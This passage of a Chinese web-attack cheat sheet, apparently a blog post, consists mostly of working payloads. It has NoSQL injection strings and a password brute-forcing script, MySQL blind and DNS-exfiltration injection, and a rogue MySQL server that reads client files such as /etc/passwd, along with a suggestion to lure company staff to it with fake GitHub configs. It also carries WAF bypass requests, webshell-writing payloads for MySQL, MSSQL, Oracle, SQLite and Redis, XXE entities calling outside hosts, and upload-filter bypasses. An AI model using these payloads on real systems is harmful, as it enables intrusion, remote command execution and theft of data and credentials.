class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]=toto&amp;password[$ne]=toto</span><br><span class="line">&#123;"username": &#123;"$ne": null&#125;, "password": &#123;"$ne": null&#125;&#125;</span><br><span class="line">&#123;"username": &#123;"$gt": undefined&#125;, "password": &#123;"$gt": undefined&#125;&#125;</span><br><span class="line"></span><br><span class="line">匹配密码长度：</span><br><span class="line">username[$ne]=toto&amp;password[$regex]=.&#123;3&#125;    </span><br><span class="line">username[$ne]=toto&amp;password[$regex]=md.&#123;1&#125;   </span><br><span class="line">&#123;"username": &#123;"$eq": "admin"&#125;, "password": &#123;"$regex": "^md" &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>盲注jio本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">'admin'</span></span><br><span class="line">password=<span class="string">''</span></span><br><span class="line">u=<span class="string">'http://example.org/login'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'?'</span>,<span class="string">'|'</span>, <span class="string">'#'</span>, <span class="string">'&amp;'</span>, <span class="string">'$'</span>]:</span><br><span class="line">      payload=<span class="string">'?username=%s&amp;password[$regex]=^%s'</span> % (username, password + c)</span><br><span class="line">      r = requests.get(u + payload)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">'Yeah'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">"Found one more char : %s"</span> % (password+c))</span><br><span class="line">        password += c</span><br></pre></td></tr></table></figure></p><p>工具：<a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a></p><h2 id="GraphQL-注入"><a href="#GraphQL-注入" class="headerlink" title="GraphQL 注入"></a>GraphQL 注入</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  teams(where:&#123;_or:[&#123;state:&#123;_eq:soft_launched&#125;&#125;, &#123;state:&#123;_eq:soft_launched&#125;&#125;]&#125;) &#123;</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        id</span><br><span class="line">        state</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>tips<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep() 等价于 benchmark()</span><br><span class="line">mid()substring() 等价于 substr()</span><br></pre></td></tr></table></figure></p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select pow(2,1024);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'pow(2,1024)'</span><br><span class="line">mysql&gt; select cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'cot(0)'</span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'</span><br></pre></td></tr></table></figure><h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'a'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line"><span class="comment"># id user pass</span></span><br><span class="line"><span class="comment">#---------------------</span></span><br><span class="line"><span class="comment"># 1 2 a</span></span><br><span class="line"><span class="comment"># 1 admin password</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'z'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line"><span class="comment"># id user pass</span></span><br><span class="line"><span class="comment">#---------------------</span></span><br><span class="line"><span class="comment"># 1 admin password</span></span><br><span class="line"><span class="comment"># 1 2 z</span></span><br><span class="line">然后对其逐位二分去确定值</span><br></pre></td></tr></table></figure><blockquote><p>参考: <a href="https://www.chabug.org/ctf/852.html" target="_blank" rel="noopener">https://www.chabug.org/ctf/852.html</a></p></blockquote><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>)x</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">`4`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> sys_config)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="dns-通道的盲注"><a href="#dns-通道的盲注" class="headerlink" title="dns 通道的盲注"></a>dns 通道的盲注</h3><p>条件:</p><ul><li>windows</li><li>有file_priv权限，且load_file不被过滤</li><li>secure_file_priv 不为NULL</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">group_concat</span>(table_name)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="string">'.xxxxx.ceye.io\\abc'</span>))</span><br></pre></td></tr></table></figure><blockquote><p>参考: <a href="http://lawlietweb.com/2018/06/30/dnslogsqli/" target="_blank" rel="noopener">http://lawlietweb.com/2018/06/30/dnslogsqli/</a></p></blockquote><h3 id="mysql-客户端文件读取"><a href="#mysql-客户端文件读取" class="headerlink" title="mysql 客户端文件读取"></a>mysql 客户端文件读取</h3><p>详解：<a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">mysql 蜜罐</a></p><p>引申：<br>curl gopher mysql攻击</p><p>只要我们把这个恶意的服务开在 3306 端口上，自然会有全球各地的扫描器来光顾，不光能读到一些客户端文件，还能接收到很多各类后门挖矿 payload，不过这只是常规操作。<br>近两年来，各大厂商都开始做自己的 GitHub 代码监控，防止内部代码泄露，借着这一点，更猥琐的思路是在 GitHub 上传包含各大厂商特征的假代码，在其 MySQL 配置中加上我们恶意服务的地址和端口，这样当厂商监控到 GitHub 的代码，大概翻一下就可以发现配置文件中的数据库密码，一般人都会去连接一下，此时……</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a><br><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277#toc-5</a></p></blockquote><h3 id="sql-bypass方法"><a href="#sql-bypass方法" class="headerlink" title="sql bypass方法"></a>sql bypass方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">///.js?</span><br><span class="line">union /*!select%252a/</span><br><span class="line">union/!/!select%201,2,3*/</span><br><span class="line">union`select`</span><br><span class="line">union%23aa%0a/!select–%01%0a/1,@$,3</span><br><span class="line">set @s = 0x73686f77207461626c65733b;prepare t from @s;execute t;</span><br><span class="line">and 使用 /***/ANd</span><br></pre></td></tr></table></figure><ul><li>更改请求类型<br>get参数改成上传参数<br>使用上传包绕waf</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerabilities/sql.php HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100109 Firefox/61.0</span><br><span class="line">Content-Type: multipart/form-data;boundary=---------------------------274591138927562</span><br><span class="line"></span><br><span class="line">-----------------------------274591138927562</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">-----------------------------274591138927562</span><br><span class="line">Content-Disposition: form-data; name=&quot;pk&quot;</span><br><span class="line"></span><br><span class="line">1111111111111 union </span><br><span class="line">-----------------------------274591138927562</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">-----------------------------274591138927562--</span><br></pre></td></tr></table></figure><ul><li><p>更改content-type头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerabilities/sql.php  HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Content-Type: multipart/form-data;boundary=---------------------------274591138927562</span><br><span class="line"></span><br><span class="line">id=1 union</span><br></pre></td></tr></table></figure></li><li><p>chunked攻击</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerabilities/sql.php HTTP/1.1</span><br><span class="line">Host: 101.71.156.8:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">2;</span><br><span class="line">ip</span><br><span class="line">4;</span><br><span class="line">=127</span><br><span class="line">3;</span><br><span class="line">.1 </span><br><span class="line">1;</span><br><span class="line">|</span><br><span class="line">2;</span><br><span class="line"> d</span><br><span class="line">2;</span><br><span class="line">ir</span><br><span class="line">14;</span><br><span class="line">&amp;Submit=Submit</span><br></pre></td></tr></table></figure><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p>通过独有函数判断数据库类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">access asc chr len #access-functions #exists(select*from msysobjects)判定access数据库</span><br><span class="line">mysql substring substr length</span><br><span class="line">mssql char ascii len substring #mssql function str</span><br><span class="line">oracle ascii chr length substr upper lower replace(x,old,new)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://xz.aliyun.com/t/2418" target="_blank" rel="noopener">https://xz.aliyun.com/t/2418</a></p></blockquote><p>sql注入getshell<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line"><span class="keyword">select</span> <span class="number">0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/1.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sql</span> <span class="keyword">server</span></span><br><span class="line">存储过程xp_cmdshell</span><br><span class="line">;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language="Jscript"%^&gt;^&lt;%eval(Request.Item["pass"],"unsafe");%^&gt; &gt; D:\\WWW\\2333.aspx' ;--</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">1、创建JAVA包</span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br><span class="line">2、JAVA权限</span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br><span class="line">3、创建函数</span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br><span class="line">URL执行</span><br><span class="line">id=602'||utl_inadd.get_host_name((<span class="keyword">select</span> LinxRUNCMD(<span class="string">'cmd /c dir d:/'</span>) <span class="keyword">from</span> dual))<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">postgresql</span><br><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br><span class="line"></span><br><span class="line">sqlite3</span><br><span class="line">;attach database 'D:\\www\\008.php' as tt;<span class="keyword">create</span> <span class="keyword">TABLE</span> tt.exp (dataz <span class="built_in">text</span>) ; <span class="keyword">insert</span> <span class="keyword">INTO</span> tt.exp (dataz) <span class="keyword">VALUES</span> (x<span class="string">'3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e'</span>);</span><br><span class="line"></span><br><span class="line">redis</span><br><span class="line">%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml2F%0D%0Aconfig%20set%20dbfilename%20shell%2Ephp%0D%0Aset%20x%2022%3C%3Fphp%20phpinfo%28%29%3B%%203F%3E%22%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure></p><h2 id="XXE-bypass"><a href="#XXE-bypass" class="headerlink" title="XXE bypass"></a>XXE bypass</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#utf-7 bypass</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-7"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE copyright[</span></span><br><span class="line"><span class="meta">+ADwAIQBFAE4AVABJAFQAWQAgAHQ-e+AHMAdAAgAFMAWQBTAFQARQBNACAAIAAiAC8-e+AHQAYwAvAHAAYQBzAHMAdwBvAHI-d+ACIAPg-</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span>             </span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">login</span>&gt;</span>            </span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>login<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 当DOCTYPE不能修改时，用xiinclude來定位</span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">"text"</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>/&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="soap-xxe"><a href="#soap-xxe" class="headerlink" title="soap xxe"></a>soap xxe</h3><p><code>&lt;soap:Body&gt;  &lt;foo&gt;    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;  &lt;/foo&gt;&lt;/soap:Body&gt;</code></p><h3 id="doc或xlsx包含xxe"><a href="#doc或xlsx包含xxe" class="headerlink" title="doc或xlsx包含xxe"></a>doc或xlsx包含xxe</h3><p>xlsx和doc文件利用xxe：工具<a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener">https://github.com/BuffaloWill/oxml_xxe</a><br><code>$ mkdir XXE &amp;&amp; cd XXE$ unzip ../XXE.xlsxArchive:  ../XXE.xlsx  inflating: xl/drawings/drawing1.xml  inflating: xl/worksheets/sheet1.xml  inflating: xl/worksheets/_rels/sheet1.xml.rels  inflating: xl/sharedStrings.xml  inflating: xl/styles.xml  inflating: xl/workbook.xml  inflating: xl/_rels/workbook.xml.rels  inflating: _rels/.rels  inflating: [Content_Types].xml</code><br>添加payload到xl/workbook.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;xml...&gt;</span><br><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://YOURCOLLABORATORID.burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line">&lt;workbook...&gt;</span><br></pre></td></tr></table></figure></p><p>重新打包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r ../poc.xslx *</span><br><span class="line">updating: [Content_Types].xml (deflated 71%)</span><br><span class="line">updating: _rels/ (stored 0%)</span><br><span class="line">updating: _rels/.rels (deflated 60%)</span><br><span class="line">updating: docProps/ (stored 0%)</span><br><span class="line">updating: docProps/app.xml (deflated 51%)</span><br><span class="line">updating: docProps/core.xml (deflated 50%)</span><br><span class="line">updating: xl/ (stored 0%)</span><br><span class="line">updating: xl/workbook.xml (deflated 56%)</span><br><span class="line">updating: xl/worksheets/ (stored 0%)</span><br><span class="line">updating: xl/worksheets/sheet1.xml (deflated 53%)</span><br><span class="line">updating: xl/styles.xml (deflated 60%)</span><br><span class="line">updating: xl/theme/ (stored 0%)</span><br><span class="line">updating: xl/theme/theme1.xml (deflated 80%)</span><br><span class="line">updating: xl/_rels/ (stored 0%)</span><br><span class="line">updating: xl/_rels/workbook.xml.rels (deflated 66%)</span><br><span class="line">updating: xl/sharedStrings.xml (deflated 17%)</span><br></pre></td></tr></table></figure></p><p>其他</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/36517036" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36517036</a></p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">php : .jpg.php 、 .php5 、 .pHt 、 .pgif</span><br><span class="line">asp : .asp, .aspx, .cer and .asa (IIS &lt;= 7.5), shell.aspx;1.jpg (IIS &lt; 7.0)</span><br><span class="line">perl: .pl, .pm, .cgi, .lib</span><br><span class="line">jsp : .jsp, .jspx, .jsw, .jsv, .jspf</span><br><span class="line">Coldfusion: .cfm, .cfml, .cfc, .dbm</span><br><span class="line"></span><br><span class="line">mine头</span><br><span class="line">Content-Type : application/octet-stream</span><br><span class="line">Content-Type : image/jpeg</span><br><span class="line">Content-Type : image/png</span><br><span class="line">Content-Type : image/gif</span><br><span class="line"></span><br><span class="line">配置文件：</span><br><span class="line">.htaccess</span><br><span class="line">web.config</span><br><span class="line">httpd.conf</span><br><span class="line">__init__.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%out.println(&quot;test&quot;);%&gt;</span><br></pre></td></tr></table></figure><h3 id="文件上传使用oss存储"><a href="#文件上传使用oss存储" class="headerlink" title="文件上传使用oss存储"></a>文件上传使用oss存储</h3><ol><li>上传html配合js进行钓鱼</li><li>如果该域名在跨域传输允许里，靠该html接收跨域信息</li><li>可以上传shtml来读取文件。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shtml用的是SSI指令，SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可。</span><br><span class="line"><span class="comment">&lt;!--#include file="/home/www/xxxxx/index.html"--&gt;</span> //可以用来读文件</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ifconfig"--&gt;</span> //可以用来执行命令</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/includes/header.html" --&gt;</span> //也是读文件 与FILE不同他支持绝对路径和../来跳转到父目录 而file只能读取当前目录下的</span><br></pre></td></tr></table></figure></li></ol><h3 id="文件上传-bypass"><a href="#文件上传-bypass" class="headerlink" title="文件上传 bypass"></a>文件上传 bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache</span><br><span class="line">x.php.x  #apache老解析漏洞</span><br><span class="line">1.php%OA  上传后访问/1.php%0A #CVE-2017-15715</span><br></pre></td></tr></table></figure><p>多文件上传  bypass方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-----------<span class="number">-128137731</span></span><br><span class="line">Content-Disposition:form-data;name=<span class="string">"file"</span>;filename=<span class="string">"1.txt"</span>;</span><br><span class="line">Content-Type:text/plain</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">-----------<span class="number">-128137731</span></span><br><span class="line">Content-Disposition:form-data;name=<span class="string">"file"</span>;filename=<span class="string">"1.php"</span>;</span><br><span class="line">Content-Type:text/plain</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>= phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">-----------<span 